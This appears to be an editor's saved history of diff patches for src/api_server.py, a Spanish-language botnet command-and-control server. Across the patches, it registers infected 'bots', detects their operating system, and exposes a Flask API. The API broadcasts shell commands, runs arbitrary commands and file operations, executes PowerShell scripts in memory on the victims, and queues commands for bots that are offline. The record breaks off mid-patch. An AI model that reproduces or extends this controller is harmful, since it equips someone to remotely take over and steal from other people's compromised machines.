{
    "sourceFile": "src/api_server.py",
    "activeCommit": 0,
    "commits": [
        {
            "activePatchIndex": 19,
            "patches": [
                {
                    "date": 1740259769964,
                    "content": "Index: \n===================================================================\n--- \n+++ \n"
                },
                {
                    "date": 1740259842511,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -1,68 +1,168 @@\n from flask import Flask, jsonify, request\r\n+import logging\r\n+import socket\r\n+import sys\r\n+import threading\r\n+import time\r\n+import os\r\n+import ipaddress\r\n+import sqlite3\r\n+import configparser\r\n \r\n app = Flask(__name__)\r\n \r\n # Variables globales\r\n bots = []\r\n bot_ids = {}\r\n sistemas_operativos = {}\r\n respuestas_bots = {}\r\n+server_running = True\r\n \r\n+def cargar_configuracion():\r\n+    \"\"\"Carga la configuraci√≥n del servidor.\"\"\"\r\n+    config = configparser.ConfigParser()\r\n+    config.read(os.path.join(os.path.dirname(__file__), \"..\", \"config\", \"config.ini\"))\r\n+    return config\r\n+\r\n+def configurar_logging(config):\r\n+    \"\"\"Configura el sistema de logging.\"\"\"\r\n+    log_path = os.path.join(os.path.dirname(__file__), \"..\", config.get(\"LOGGING\", \"LOG_DIR\"), config.get(\"LOGGING\", \"SERVER_LOG_FILE\"))\r\n+    os.makedirs(os.path.dirname(log_path), exist_ok=True)\r\n+    \r\n+    logging.basicConfig(\r\n+        level=logging.INFO,\r\n+        format=\"%(asctime)s - %(levelname)s - %(message)s\",\r\n+        handlers=[\r\n+            logging.FileHandler(log_path, encoding=\"utf-8\"),\r\n+            logging.StreamHandler()\r\n+        ]\r\n+    )\r\n+\r\n+def aceptar_conexiones(server):\r\n+    \"\"\"Acepta conexiones de bots.\"\"\"\r\n+    global server_running\r\n+    bot_id = 1\r\n+    while server_running:\r\n+        try:\r\n+            conn, addr = server.accept()\r\n+            bots.append(conn)\r\n+            bot_ids[conn] = bot_id\r\n+            threading.Thread(target=manejar_bot, args=(conn, addr, bot_id)).start()\r\n+            bot_id += 1\r\n+        except socket.timeout:\r\n+            continue\r\n+        except Exception as e:\r\n+            if server_running:\r\n+                logging.error(f\"Error aceptando conexi√≥n: {e}\")\r\n+\r\n+def manejar_bot(conn, addr, bot_id):\r\n+    \"\"\"Maneja la conexi√≥n con un bot.\"\"\"\r\n+    try:\r\n+        logging.info(f\"Bot {bot_id} conectado desde {addr}\")\r\n+        \r\n+        # Detectar sistema operativo\r\n+        conn.send(\"detect_os\".encode(\"utf-8\"))\r\n+        os_info = conn.recv(1024).decode(\"utf-8\").strip().lower()\r\n+        sistemas_operativos[conn] = \"windows\" if \"windows\" in os_info else \"linux\"\r\n+        \r\n+        while True:\r\n+            try:\r\n+                data = conn.recv(4096).decode(\"utf-8\", errors=\"ignore\").strip()\r\n+                if data:\r\n+                    respuestas_bots[bot_id] = data\r\n+            except:\r\n+                break\r\n+    except Exception as e:\r\n+        logging.error(f\"Error con bot {bot_id}: {e}\")\r\n+    finally:\r\n+        conn.close()\r\n+        if conn in bots:\r\n+            bots.remove(conn)\r\n+            del bot_ids[conn]\r\n+            del sistemas_operativos[conn]\r\n+\r\n @app.route('/listar_bots', methods=['GET'])\r\n def listar_bots():\r\n-    \"\"\"Lista todos los bots conectados al servidor C&C.\"\"\"\r\n+    \"\"\"Lista todos los bots conectados.\"\"\"\r\n     try:\r\n         if bots:\r\n-            bots_info = []\r\n-            for bot in bots:\r\n-                so = sistemas_operativos.get(bot, \"Desconocido\")\r\n-                bots_info.append({\r\n-                    \"id\": bot_ids[bot],\r\n-                    \"so\": so.capitalize(),\r\n-                    \"direccion\": bot.getpeername()\r\n-                })\r\n-            return jsonify(bots_info)\r\n-        else:\r\n-            return jsonify({\"message\": \"No hay bots conectados.\"})\r\n+            return jsonify([{\r\n+                \"id\": bot_ids[bot],\r\n+                \"so\": sistemas_operativos.get(bot, \"Desconocido\").capitalize(),\r\n+                \"direccion\": bot.getpeername()\r\n+            } for bot in bots])\r\n+        return jsonify({\"message\": \"No hay bots conectados.\"})\r\n     except Exception as e:\r\n         return jsonify({\"error\": str(e)}), 500\r\n \r\n @app.route('/enviar_comando', methods=['POST'])\r\n def enviar_comando():\r\n-    \"\"\"Env√≠a un comando a los bots conectados.\"\"\"\r\n+    \"\"\"Env√≠a comandos a los bots.\"\"\"\r\n     try:\r\n         data = request.json\r\n-        comando_windows = data.get(\"comando_windows\")\r\n-        comando_linux = data.get(\"comando_linux\")\r\n-        \r\n         if not bots:\r\n             return jsonify({\"message\": \"No hay bots conectados.\"})\r\n \r\n         respuestas = {}\r\n         for bot in bots:\r\n-            so = sistemas_operativos.get(bot, \"desconocido\")\r\n-            comando = comando_windows if so == \"windows\" else comando_linux\r\n             try:\r\n-                bot.send(comando.encode('utf-8'))\r\n+                comando = data[\"comando_windows\"] if sistemas_operativos[bot] == \"windows\" else data[\"comando_linux\"]\r\n+                bot.send(comando.encode(\"utf-8\"))\r\n+                bot_id = bot_ids[bot]\r\n+                \r\n+                # Esperar respuesta\r\n+                tiempo_inicio = time.time()\r\n+                while time.time() - tiempo_inicio < 5:\r\n+                    if bot_id in respuestas_bots:\r\n+                        respuestas[bot_id] = respuestas_bots.pop(bot_id)\r\n+                        break\r\n+                    time.sleep(0.1)\r\n             except:\r\n                 continue\r\n-        \r\n-        return jsonify({\"message\": \"Comando enviado correctamente\"})\r\n+\r\n+        return jsonify({\"respuestas\": respuestas})\r\n     except Exception as e:\r\n         return jsonify({\"error\": str(e)}), 500\r\n \r\n @app.route('/shutdown', methods=['POST'])\r\n def shutdown():\r\n     \"\"\"Apaga el servidor y desconecta todos los bots.\"\"\"\r\n+    global server_running\r\n     try:\r\n+        server_running = False\r\n         for bot in bots[:]:\r\n             try:\r\n-                bot.send(\"shutdown\".encode('utf-8'))\r\n+                bot.send(\"shutdown\".encode(\"utf-8\"))\r\n                 bot.close()\r\n-                bots.remove(bot)\r\n             except:\r\n                 pass\r\n-        \r\n+        bots.clear()\r\n+        bot_ids.clear()\r\n+        sistemas_operativos.clear()\r\n+        respuestas_bots.clear()\r\n         return jsonify({\"message\": \"Servidor apagado correctamente\"})\r\n     except Exception as e:\r\n         return jsonify({\"error\": str(e)}), 500\r\n+\r\n+def iniciar_servidor_cnc():\r\n+    \"\"\"Inicia el servidor CnC.\"\"\"\r\n+    global server_running\r\n+    try:\r\n+        config = cargar_configuracion()\r\n+        configurar_logging(config)\r\n+        \r\n+        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n+        server.bind((config.get(\"NETWORK\", \"HOST\"), config.getint(\"NETWORK\", \"PORT\")))\r\n+        server.listen(5)\r\n+        server.settimeout(1)\r\n+        \r\n+        threading.Thread(target=aceptar_conexiones, args=(server,)).start()\r\n+        \r\n+        return True\r\n+    except Exception as e:\r\n+        logging.error(f\"Error iniciando servidor CnC: {e}\")\r\n+        return False\r\n+\r\n+if __name__ == \"__main__\":\r\n+    if iniciar_servidor_cnc():\r\n+        app.run(host=\"127.0.0.1\", port=5000)\r\n"
                },
                {
                    "date": 1740260038685,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -163,6 +163,16 @@\n         logging.error(f\"Error iniciando servidor CnC: {e}\")\r\n         return False\r\n \r\n if __name__ == \"__main__\":\r\n-    if iniciar_servidor_cnc():\r\n-        app.run(host=\"127.0.0.1\", port=5000)\r\n+    try:\r\n+        print(\"üîß Iniciando servidor C&C...\")\r\n+        if iniciar_servidor_cnc():\r\n+            print(\"‚úÖ Servidor C&C iniciado correctamente\")\r\n+            print(\"üåê Iniciando servidor web...\")\r\n+            app.run(host=\"127.0.0.1\", port=5000, debug=False)\r\n+        else:\r\n+            print(\"‚ùå Error al iniciar el servidor C&C\")\r\n+            sys.exit(1)\r\n+    except Exception as e:\r\n+        print(f\"‚ùå Error cr√≠tico: {e}\")\r\n+        sys.exit(1)\r\n"
                },
                {
                    "date": 1740260144630,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -164,15 +164,15 @@\n         return False\r\n \r\n if __name__ == \"__main__\":\r\n     try:\r\n-        print(\"üîß Iniciando servidor C&C...\")\r\n+        print(\"[*] Iniciando servidor C&C...\")\r\n         if iniciar_servidor_cnc():\r\n-            print(\"‚úÖ Servidor C&C iniciado correctamente\")\r\n-            print(\"üåê Iniciando servidor web...\")\r\n+            print(\"[+] Servidor C&C iniciado correctamente\")\r\n+            print(\"[*] Iniciando servidor web...\")\r\n             app.run(host=\"127.0.0.1\", port=5000, debug=False)\r\n         else:\r\n-            print(\"‚ùå Error al iniciar el servidor C&C\")\r\n+            print(\"[-] Error al iniciar el servidor C&C\")\r\n             sys.exit(1)\r\n     except Exception as e:\r\n-        print(f\"‚ùå Error cr√≠tico: {e}\")\r\n+        print(f\"[-] Error cr√≠tico: {e}\")\r\n         sys.exit(1)\r\n"
                },
                {
                    "date": 1740260238808,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -57,30 +57,57 @@\n \r\n def manejar_bot(conn, addr, bot_id):\r\n     \"\"\"Maneja la conexi√≥n con un bot.\"\"\"\r\n     try:\r\n-        logging.info(f\"Bot {bot_id} conectado desde {addr}\")\r\n+        # Esperar identificaci√≥n del bot\r\n+        try:\r\n+            identificador = conn.recv(1024).decode(\"utf-8\").strip()\r\n+            if not identificador:\r\n+                conn.close()\r\n+                return\r\n+                \r\n+            logging.info(f\"Bot {bot_id} conectado desde {addr} con ID: {identificador}\")\r\n+            print(f\"[+] Bot {bot_id} conectado desde {addr}\")\r\n+            \r\n+            # Detectar sistema operativo\r\n+            conn.send(\"detect_os\".encode(\"utf-8\"))\r\n+            os_info = conn.recv(1024).decode(\"utf-8\").strip().lower()\r\n+            if not os_info:\r\n+                conn.close()\r\n+                return\r\n+                \r\n+            sistemas_operativos[conn] = \"windows\" if \"windows\" in os_info else \"linux\"\r\n+            print(f\"[+] Bot {bot_id} identificado como {sistemas_operativos[conn].capitalize()}\")\r\n+            \r\n+            # Agregar bot a las listas solo si la identificaci√≥n fue exitosa\r\n+            bots.append(conn)\r\n+            bot_ids[conn] = bot_id\r\n+            \r\n+        except Exception as e:\r\n+            logging.error(f\"Error en la identificaci√≥n del bot: {e}\")\r\n+            conn.close()\r\n+            return\r\n         \r\n-        # Detectar sistema operativo\r\n-        conn.send(\"detect_os\".encode(\"utf-8\"))\r\n-        os_info = conn.recv(1024).decode(\"utf-8\").strip().lower()\r\n-        sistemas_operativos[conn] = \"windows\" if \"windows\" in os_info else \"linux\"\r\n-        \r\n         while True:\r\n             try:\r\n                 data = conn.recv(4096).decode(\"utf-8\", errors=\"ignore\").strip()\r\n-                if data:\r\n-                    respuestas_bots[bot_id] = data\r\n+                if not data:\r\n+                    break\r\n+                respuestas_bots[bot_id] = data\r\n             except:\r\n                 break\r\n+                \r\n     except Exception as e:\r\n         logging.error(f\"Error con bot {bot_id}: {e}\")\r\n     finally:\r\n         conn.close()\r\n         if conn in bots:\r\n             bots.remove(conn)\r\n-            del bot_ids[conn]\r\n-            del sistemas_operativos[conn]\r\n+            if conn in bot_ids:\r\n+                del bot_ids[conn]\r\n+            if conn in sistemas_operativos:\r\n+                del sistemas_operativos[conn]\r\n+            print(f\"[-] Bot {bot_id} desconectado\")\r\n \r\n @app.route('/listar_bots', methods=['GET'])\r\n def listar_bots():\r\n     \"\"\"Lista todos los bots conectados.\"\"\"\r\n@@ -155,11 +182,26 @@\n         server.bind((config.get(\"NETWORK\", \"HOST\"), config.getint(\"NETWORK\", \"PORT\")))\r\n         server.listen(5)\r\n         server.settimeout(1)\r\n         \r\n-        threading.Thread(target=aceptar_conexiones, args=(server,)).start()\r\n+        print(f\"[+] Servidor escuchando en {config.get('NETWORK', 'HOST')}:{config.getint('NETWORK', 'PORT')}\")\r\n         \r\n+        def accept_wrapper():\r\n+            next_bot_id = 1\r\n+            while server_running:\r\n+                try:\r\n+                    conn, addr = server.accept()\r\n+                    threading.Thread(target=manejar_bot, args=(conn, addr, next_bot_id)).start()\r\n+                    next_bot_id += 1\r\n+                except socket.timeout:\r\n+                    continue\r\n+                except Exception as e:\r\n+                    if server_running:\r\n+                        logging.error(f\"Error aceptando conexi√≥n: {e}\")\r\n+        \r\n+        threading.Thread(target=accept_wrapper, daemon=True).start()\r\n         return True\r\n+        \r\n     except Exception as e:\r\n         logging.error(f\"Error iniciando servidor CnC: {e}\")\r\n         return False\r\n \r\n"
                },
                {
                    "date": 1740260310149,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -178,13 +178,15 @@\n         config = cargar_configuracion()\r\n         configurar_logging(config)\r\n         \r\n         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n-        server.bind((config.get(\"NETWORK\", \"HOST\"), config.getint(\"NETWORK\", \"PORT\")))\r\n+        host = config.get(\"NETWORK\", \"HOST\")\r\n+        port = config.getint(\"NETWORK\", \"PORT\")  # Usando el puerto CnC\r\n+        server.bind((host, port))\r\n         server.listen(5)\r\n         server.settimeout(1)\r\n         \r\n-        print(f\"[+] Servidor escuchando en {config.get('NETWORK', 'HOST')}:{config.getint('NETWORK', 'PORT')}\")\r\n+        print(f\"[+] Servidor CnC escuchando en {host}:{port}\")\r\n         \r\n         def accept_wrapper():\r\n             next_bot_id = 1\r\n             while server_running:\r\n@@ -210,9 +212,10 @@\n         print(\"[*] Iniciando servidor C&C...\")\r\n         if iniciar_servidor_cnc():\r\n             print(\"[+] Servidor C&C iniciado correctamente\")\r\n             print(\"[*] Iniciando servidor web...\")\r\n-            app.run(host=\"127.0.0.1\", port=5000, debug=False)\r\n+            api_port = cargar_configuracion().getint(\"NETWORK\", \"API_PORT\")  # Puerto para la API\r\n+            app.run(host=\"127.0.0.1\", port=api_port, debug=False)\r\n         else:\r\n             print(\"[-] Error al iniciar el servidor C&C\")\r\n             sys.exit(1)\r\n     except Exception as e:\r\n"
                },
                {
                    "date": 1740260492060,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -212,10 +212,16 @@\n         print(\"[*] Iniciando servidor C&C...\")\r\n         if iniciar_servidor_cnc():\r\n             print(\"[+] Servidor C&C iniciado correctamente\")\r\n             print(\"[*] Iniciando servidor web...\")\r\n-            api_port = cargar_configuracion().getint(\"NETWORK\", \"API_PORT\")  # Puerto para la API\r\n-            app.run(host=\"127.0.0.1\", port=api_port, debug=False)\r\n+            api_port = cargar_configuracion().getint(\"NETWORK\", \"API_PORT\")\r\n+            print(\"[*] Servidor web escuchando en http://127.0.0.1:5000\")\r\n+            # Silenciar los mensajes de desarrollo de Flask\r\n+            import logging\r\n+            log = logging.getLogger('werkzeug')\r\n+            log.setLevel(logging.ERROR)\r\n+            # Iniciar Flask sin mensajes de desarrollo\r\n+            app.run(host=\"127.0.0.1\", port=api_port, debug=False, use_reloader=False)\r\n         else:\r\n             print(\"[-] Error al iniciar el servidor C&C\")\r\n             sys.exit(1)\r\n     except Exception as e:\r\n"
                },
                {
                    "date": 1740261093320,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -170,8 +170,101 @@\n         return jsonify({\"message\": \"Servidor apagado correctamente\"})\r\n     except Exception as e:\r\n         return jsonify({\"error\": str(e)}), 500\r\n \r\n+from modules.basic_commands import *\r\n+from modules.file_operations import *\r\n+from modules.advanced_execution import *\r\n+\r\n+# Nuevos endpoints despu√©s de los existentes\r\n+@app.route('/execute_command', methods=['POST'])\r\n+def execute_system_command_endpoint():\r\n+    \"\"\"Ejecuta un comando del sistema en los bots seleccionados.\"\"\"\r\n+    try:\r\n+        data = request.json\r\n+        command = data.get('command')\r\n+        bot_ids = data.get('bot_ids', [])\r\n+        \r\n+        respuestas = {}\r\n+        for bot in bots:\r\n+            if not bot_ids or bot_ids.get(bot) in bot_ids:\r\n+                try:\r\n+                    bot.send(f\"cmd:{command}\".encode(\"utf-8\"))\r\n+                    bot_id = bot_ids[bot]\r\n+                    # Esperar respuesta\r\n+                    tiempo_inicio = time.time()\r\n+                    while time.time() - tiempo_inicio < 5:\r\n+                        if bot_id in respuestas_bots:\r\n+                            respuestas[bot_id] = respuestas_bots.pop(bot_id)\r\n+                            break\r\n+                        time.sleep(0.1)\r\n+                except:\r\n+                    continue\r\n+        return jsonify({\"respuestas\": respuestas})\r\n+    except Exception as e:\r\n+        return jsonify({\"error\": str(e)}), 500\r\n+\r\n+@app.route('/file_operations', methods=['POST'])\r\n+def file_operations_endpoint():\r\n+    \"\"\"Maneja operaciones con archivos.\"\"\"\r\n+    try:\r\n+        data = request.json\r\n+        operation = data.get('operation')\r\n+        path = data.get('path')\r\n+        file_data = data.get('file_data')\r\n+        bot_ids = data.get('bot_ids', [])\r\n+        \r\n+        respuestas = {}\r\n+        for bot in bots:\r\n+            if not bot_ids or bot_ids.get(bot) in bot_ids:\r\n+                try:\r\n+                    cmd = f\"file:{operation}:{path}\"\r\n+                    if file_data:\r\n+                        cmd += f\":{file_data}\"\r\n+                    bot.send(cmd.encode(\"utf-8\"))\r\n+                    bot_id = bot_ids[bot]\r\n+                    # Esperar respuesta\r\n+                    tiempo_inicio = time.time()\r\n+                    while time.time() - tiempo_inicio < 5:\r\n+                        if bot_id in respuestas_bots:\r\n+                            respuestas[bot_id] = respuestas_bots.pop(bot_id)\r\n+                            break\r\n+                        time.sleep(0.1)\r\n+                except:\r\n+                    continue\r\n+        return jsonify({\"respuestas\": respuestas})\r\n+    except Exception as e:\r\n+        return jsonify({\"error\": str(e)}), 500\r\n+\r\n+@app.route('/execute_script', methods=['POST'])\r\n+def execute_script_endpoint():\r\n+    \"\"\"Ejecuta scripts en memoria.\"\"\"\r\n+    try:\r\n+        data = request.json\r\n+        script = data.get('script')\r\n+        script_type = data.get('type', 'powershell')\r\n+        bot_ids = data.get('bot_ids', [])\r\n+        \r\n+        respuestas = {}\r\n+        for bot in bots:\r\n+            if not bot_ids or bot_ids.get(bot) in bot_ids:\r\n+                try:\r\n+                    cmd = f\"script:{script_type}:{script}\"\r\n+                    bot.send(cmd.encode(\"utf-8\"))\r\n+                    bot_id = bot_ids[bot]\r\n+                    # Esperar respuesta\r\n+                    tiempo_inicio = time.time()\r\n+                    while time.time() - tiempo_inicio < 5:\r\n+                        if bot_id in respuestas_bots:\r\n+                            respuestas[bot_id] = respuestas_bots.pop(bot_id)\r\n+                            break\r\n+                        time.sleep(0.1)\r\n+                except:\r\n+                    continue\r\n+        return jsonify({\"respuestas\": respuestas})\r\n+    except Exception as e:\r\n+        return jsonify({\"error\": str(e)}), 500\r\n+\r\n def iniciar_servidor_cnc():\r\n     \"\"\"Inicia el servidor CnC.\"\"\"\r\n     global server_running\r\n     try:\r\n"
                },
                {
                    "date": 1740264704059,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -54,71 +54,104 @@\n         except Exception as e:\r\n             if server_running:\r\n                 logging.error(f\"Error aceptando conexi√≥n: {e}\")\r\n \r\n+from modules.database_manager import DatabaseManager\r\n+\r\n+# Inicializar el gestor de base de datos\r\n+db = DatabaseManager(os.path.join(os.path.dirname(__file__), \"..\", \"bbdd\", \"bots.db\"))\r\n+\r\n def manejar_bot(conn, addr, bot_id):\r\n     \"\"\"Maneja la conexi√≥n con un bot.\"\"\"\r\n     try:\r\n         # Esperar identificaci√≥n del bot\r\n-        try:\r\n-            identificador = conn.recv(1024).decode(\"utf-8\").strip()\r\n-            if not identificador:\r\n-                conn.close()\r\n-                return\r\n-                \r\n-            logging.info(f\"Bot {bot_id} conectado desde {addr} con ID: {identificador}\")\r\n-            print(f\"[+] Bot {bot_id} conectado desde {addr}\")\r\n-            \r\n-            # Detectar sistema operativo\r\n-            conn.send(\"detect_os\".encode(\"utf-8\"))\r\n-            os_info = conn.recv(1024).decode(\"utf-8\").strip().lower()\r\n-            if not os_info:\r\n-                conn.close()\r\n-                return\r\n-                \r\n-            sistemas_operativos[conn] = \"windows\" if \"windows\" in os_info else \"linux\"\r\n-            print(f\"[+] Bot {bot_id} identificado como {sistemas_operativos[conn].capitalize()}\")\r\n-            \r\n-            # Agregar bot a las listas solo si la identificaci√≥n fue exitosa\r\n-            bots.append(conn)\r\n-            bot_ids[conn] = bot_id\r\n-            \r\n-        except Exception as e:\r\n-            logging.error(f\"Error en la identificaci√≥n del bot: {e}\")\r\n+        identificador = conn.recv(1024).decode(\"utf-8\").strip()\r\n+        if not identificador:\r\n             conn.close()\r\n             return\r\n+            \r\n+        # Detectar sistema operativo\r\n+        conn.send(\"detect_os\".encode(\"utf-8\"))\r\n+        os_info = conn.recv(1024).decode(\"utf-8\").strip().lower()\r\n+        sistema = \"windows\" if \"windows\" in os_info else \"linux\"\r\n         \r\n+        # Registrar o actualizar bot en la base de datos\r\n+        db_bot_id = db.register_bot(\r\n+            unique_id=identificador,\r\n+            ip_address=addr[0],\r\n+            system_os=sistema,\r\n+            hostname=f\"bot_{bot_id}\",\r\n+            additional_info={\r\n+                \"port\": addr[1],\r\n+                \"connection_time\": datetime.now().isoformat()\r\n+            }\r\n+        )\r\n+        \r\n+        logging.info(f\"Bot {bot_id} registrado en DB con ID {db_bot_id}\")\r\n+        \r\n+        # Agregar a las estructuras en memoria\r\n+        sistemas_operativos[conn] = sistema\r\n+        bots.append(conn)\r\n+        bot_ids[conn] = bot_id\r\n+        \r\n+        # Procesar comandos pendientes\r\n+        pending_commands = db.get_pending_commands(db_bot_id)\r\n+        for cmd in pending_commands:\r\n+            try:\r\n+                conn.send(cmd['command'].encode(\"utf-8\"))\r\n+                # Esperar respuesta\r\n+                response = conn.recv(4096).decode(\"utf-8\", errors=\"ignore\").strip()\r\n+                if response:\r\n+                    db.store_response(db_bot_id, cmd['command'], response)\r\n+                db.mark_command_executed(cmd['id'])\r\n+            except:\r\n+                continue\r\n+        \r\n+        # Bucle principal de comunicaci√≥n\r\n         while True:\r\n             try:\r\n                 data = conn.recv(4096).decode(\"utf-8\", errors=\"ignore\").strip()\r\n                 if not data:\r\n                     break\r\n+                    \r\n+                # Almacenar respuesta en la base de datos\r\n+                db.store_response(db_bot_id, \"unknown\", data)\r\n                 respuestas_bots[bot_id] = data\r\n+                \r\n             except:\r\n                 break\r\n                 \r\n     except Exception as e:\r\n         logging.error(f\"Error con bot {bot_id}: {e}\")\r\n     finally:\r\n+        # Marcar bot como inactivo en la base de datos\r\n+        try:\r\n+            db.mark_bot_inactive(db_bot_id)\r\n+        except:\r\n+            pass\r\n+            \r\n         conn.close()\r\n         if conn in bots:\r\n             bots.remove(conn)\r\n-            if conn in bot_ids:\r\n-                del bot_ids[conn]\r\n-            if conn in sistemas_operativos:\r\n-                del sistemas_operativos[conn]\r\n-            print(f\"[-] Bot {bot_id} desconectado\")\r\n+        if conn in bot_ids:\r\n+            del bot_ids[conn]\r\n+        if conn in sistemas_operativos:\r\n+            del sistemas_operativos[conn]\r\n \r\n @app.route('/listar_bots', methods=['GET'])\r\n def listar_bots():\r\n     \"\"\"Lista todos los bots conectados.\"\"\"\r\n     try:\r\n-        if bots:\r\n+        active_bots = db.get_active_bots()\r\n+        if active_bots:\r\n             return jsonify([{\r\n-                \"id\": bot_ids[bot],\r\n-                \"so\": sistemas_operativos.get(bot, \"Desconocido\").capitalize(),\r\n-                \"direccion\": bot.getpeername()\r\n-            } for bot in bots])\r\n+                \"id\": bot[\"id\"],\r\n+                \"unique_id\": bot[\"unique_id\"],\r\n+                \"so\": bot[\"system_os\"].capitalize(),\r\n+                \"ip\": bot[\"ip_address\"],\r\n+                \"hostname\": bot[\"hostname\"],\r\n+                \"last_seen\": bot[\"last_seen\"]\r\n+            } for bot in active_bots])\r\n         return jsonify({\"message\": \"No hay bots conectados.\"})\r\n     except Exception as e:\r\n         return jsonify({\"error\": str(e)}), 500\r\n \r\n"
                },
                {
                    "date": 1740264750926,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -0,0 +1,355 @@\n+from flask import Flask, jsonify, request\r\n+import logging\r\n+import socket\r\n+import sys\r\n+import threading\r\n+import time\r\n+import os\r\n+import ipaddress\r\n+import sqlite3\r\n+import configparser\r\n+\r\n+app = Flask(__name__)\r\n+\r\n+# Variables globales\r\n+bots = []\r\n+bot_ids = {}\r\n+sistemas_operativos = {}\r\n+respuestas_bots = {}\r\n+server_running = True\r\n+\r\n+def cargar_configuracion():\r\n+    \"\"\"Carga la configuraci√≥n del servidor.\"\"\"\r\n+    config = configparser.ConfigParser()\r\n+    config.read(os.path.join(os.path.dirname(__file__), \"..\", \"config\", \"config.ini\"))\r\n+    return config\r\n+\r\n+def configurar_logging(config):\r\n+    \"\"\"Configura el sistema de logging.\"\"\"\r\n+    log_path = os.path.join(os.path.dirname(__file__), \"..\", config.get(\"LOGGING\", \"LOG_DIR\"), config.get(\"LOGGING\", \"SERVER_LOG_FILE\"))\r\n+    os.makedirs(os.path.dirname(log_path), exist_ok=True)\r\n+    \r\n+    logging.basicConfig(\r\n+        level=logging.INFO,\r\n+        format=\"%(asctime)s - %(levelname)s - %(message)s\",\r\n+        handlers=[\r\n+            logging.FileHandler(log_path, encoding=\"utf-8\"),\r\n+            logging.StreamHandler()\r\n+        ]\r\n+    )\r\n+\r\n+def aceptar_conexiones(server):\r\n+    \"\"\"Acepta conexiones de bots.\"\"\"\r\n+    global server_running\r\n+    bot_id = 1\r\n+    while server_running:\r\n+        try:\r\n+            conn, addr = server.accept()\r\n+            bots.append(conn)\r\n+            bot_ids[conn] = bot_id\r\n+            threading.Thread(target=manejar_bot, args=(conn, addr, bot_id)).start()\r\n+            bot_id += 1\r\n+        except socket.timeout:\r\n+            continue\r\n+        except Exception as e:\r\n+            if server_running:\r\n+                logging.error(f\"Error aceptando conexi√≥n: {e}\")\r\n+\r\n+from modules.database_manager import DatabaseManager\r\n+\r\n+# Inicializar el gestor de base de datos\r\n+db = DatabaseManager(os.path.join(os.path.dirname(__file__), \"..\", \"bbdd\", \"bots.db\"))\r\n+\r\n+def manejar_bot(conn, addr, bot_id):\r\n+    \"\"\"Maneja la conexi√≥n con un bot.\"\"\"\r\n+    try:\r\n+        # Esperar identificaci√≥n del bot\r\n+        identificador = conn.recv(1024).decode(\"utf-8\").strip()\r\n+        if not identificador:\r\n+            conn.close()\r\n+            return\r\n+            \r\n+        # Detectar sistema operativo\r\n+        conn.send(\"detect_os\".encode(\"utf-8\"))\r\n+        os_info = conn.recv(1024).decode(\"utf-8\").strip().lower()\r\n+        sistema = \"windows\" if \"windows\" in os_info else \"linux\"\r\n+        \r\n+        # Registrar o actualizar bot en la base de datos\r\n+        db_bot_id = db.register_bot(\r\n+            unique_id=identificador,\r\n+            ip_address=addr[0],\r\n+            system_os=sistema,\r\n+            hostname=f\"bot_{bot_id}\",\r\n+            additional_info={\r\n+                \"port\": addr[1],\r\n+                \"connection_time\": datetime.now().isoformat()\r\n+            }\r\n+        )\r\n+        \r\n+        logging.info(f\"Bot {bot_id} registrado en DB con ID {db_bot_id}\")\r\n+        \r\n+        # Agregar a las estructuras en memoria\r\n+        sistemas_operativos[conn] = sistema\r\n+        bots.append(conn)\r\n+        bot_ids[conn] = bot_id\r\n+        \r\n+        # Procesar comandos pendientes\r\n+        pending_commands = db.get_pending_commands(db_bot_id)\r\n+        for cmd in pending_commands:\r\n+            try:\r\n+                conn.send(cmd['command'].encode(\"utf-8\"))\r\n+                # Esperar respuesta\r\n+                response = conn.recv(4096).decode(\"utf-8\", errors=\"ignore\").strip()\r\n+                if response:\r\n+                    db.store_response(db_bot_id, cmd['command'], response)\r\n+                db.mark_command_executed(cmd['id'])\r\n+            except:\r\n+                continue\r\n+        \r\n+        # Bucle principal de comunicaci√≥n\r\n+        while True:\r\n+            try:\r\n+                data = conn.recv(4096).decode(\"utf-8\", errors=\"ignore\").strip()\r\n+                if not data:\r\n+                    break\r\n+                    \r\n+                # Almacenar respuesta en la base de datos\r\n+                db.store_response(db_bot_id, \"unknown\", data)\r\n+                respuestas_bots[bot_id] = data\r\n+                \r\n+            except:\r\n+                break\r\n+                \r\n+    except Exception as e:\r\n+        logging.error(f\"Error con bot {bot_id}: {e}\")\r\n+    finally:\r\n+        # Marcar bot como inactivo en la base de datos\r\n+        try:\r\n+            db.mark_bot_inactive(db_bot_id)\r\n+        except:\r\n+            pass\r\n+            \r\n+        conn.close()\r\n+        if conn in bots:\r\n+            bots.remove(conn)\r\n+        if conn in bot_ids:\r\n+            del bot_ids[conn]\r\n+        if conn in sistemas_operativos:\r\n+            del sistemas_operativos[conn]\r\n+\r\n+@app.route('/listar_bots', methods=['GET'])\r\n+def listar_bots():\r\n+    \"\"\"Lista todos los bots conectados.\"\"\"\r\n+    try:\r\n+        active_bots = db.get_active_bots()\r\n+        if active_bots:\r\n+            return jsonify([{\r\n+                \"id\": bot[\"id\"],\r\n+                \"unique_id\": bot[\"unique_id\"],\r\n+                \"so\": bot[\"system_os\"].capitalize(),\r\n+                \"ip\": bot[\"ip_address\"],\r\n+                \"hostname\": bot[\"hostname\"],\r\n+                \"last_seen\": bot[\"last_seen\"]\r\n+            } for bot in active_bots])\r\n+        return jsonify({\"message\": \"No hay bots conectados.\"})\r\n+    except Exception as e:\r\n+        return jsonify({\"error\": str(e)}), 500\r\n+\r\n+@app.route('/enviar_comando', methods=['POST'])\r\n+def enviar_comando():\r\n+    \"\"\"Env√≠a comandos a los bots.\"\"\"\r\n+    try:\r\n+        data = request.json\r\n+        if not bots:\r\n+            return jsonify({\"message\": \"No hay bots conectados.\"})\r\n+\r\n+        respuestas = {}\r\n+        for bot in bots:\r\n+            try:\r\n+                comando = data[\"comando_windows\"] if sistemas_operativos[bot] == \"windows\" else data[\"comando_linux\"]\r\n+                bot.send(comando.encode(\"utf-8\"))\r\n+                bot_id = bot_ids[bot]\r\n+                \r\n+                # Esperar respuesta\r\n+                tiempo_inicio = time.time()\r\n+                while time.time() - tiempo_inicio < 5:\r\n+                    if bot_id in respuestas_bots:\r\n+                        